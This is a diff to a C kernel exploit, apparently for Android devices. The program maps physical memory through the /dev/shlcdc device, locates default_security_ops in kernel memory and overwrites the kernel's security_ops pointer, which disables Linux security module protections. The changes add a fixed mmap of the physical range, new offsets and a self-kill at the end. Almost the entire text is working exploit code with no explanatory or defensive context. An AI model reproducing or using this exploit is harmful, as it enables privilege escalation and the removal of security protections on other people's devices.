@@ -24,11 +24,11 @@
 #include <unistd.h>
 #include <errno.h>
 #include <stdbool.h>
-
-#include "shlcdc_mmap.h"
+#include <signal.h>
 
 #define KERNEL_BASE_ADDRESS 0x200000
-#define MAPPED_OFFSET 0x1000
+#define MAPPED_OFFSET 0x5000000 /* 0x90000000 - 0x8B0000000 */
+#define PHYS_OFFSET 0x80000000
 
 static uint32_t reset_security_ops_asm[] = { 0xe59f2008, 0xe59f3008, 0xe5832000, 0xe12fff1e };
 static size_t reset_security_ops_asm_length = sizeof(reset_security_ops_asm);
@@ -96,6 +96,7 @@ find_default_security_ops(void *mem, size_t length)
   printf("Found default_security_ops at %p\n", default_security_ops);
   dump(reset_security_ops, mem);
 
+  dump(*default_security_ops, mem);
   return convert_to_kernel_address(*default_security_ops, mem);
 }
 
@@ -146,7 +147,7 @@ change_security_ops_to_default(void *mmap_address, size_t length)
   security_ops = get_security_ops(reset_security_ops, mmap_address);
 
   security_ops_pointer = (void*)security_ops;
-  printf("Changed security_ops to default_security_ops(0x%08x)\n",
+  printf("Changed security_ops to default_security_ops(%p)\n",
          convert_to_kernel_address(default_security_ops, mmap_address));
   *security_ops_pointer = convert_to_kernel_address(default_security_ops, mmap_address);
   dump(security_ops, mmap_address);
@@ -159,24 +160,23 @@ set_default_security_ops(void)
 {
   int fd;
   void *mmap_address = NULL;
-  int page_size = sysconf(_SC_PAGE_SIZE);
-  int length = page_size * page_size + 0x200000;
+  void *start_address = (void*)0x10000000;
   bool success = false;
 
-  fd = shlcdc_mmap_device_open();
+  fd = open("/dev/shlcdc", O_RDWR);
   if (fd < 0) {
     return false;
   }
 
-  mmap_address = shlcdc_mmap(NULL, length, fd);
+  mmap_address = mmap(start_address, PHYS_OFFSET, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd, 0);
   if (mmap_address == MAP_FAILED) {
     printf("Failed to mmap due to %s\n", strerror(errno));
     goto close;
   }
 
-  success = change_security_ops_to_default(mmap_address, length);
+  success = change_security_ops_to_default((void*)PHYS_OFFSET, 0x10000000);
 
-  shlcdc_munmap(mmap_address, length);
+  munmap(start_address, PHYS_OFFSET);
 
 close:
   close(fd);
@@ -189,6 +189,7 @@ main(int argc, char **argv)
 {
   set_default_security_ops();
 
+  kill(getpid(), SIGKILL);
   exit(EXIT_SUCCESS);
 }
 /*
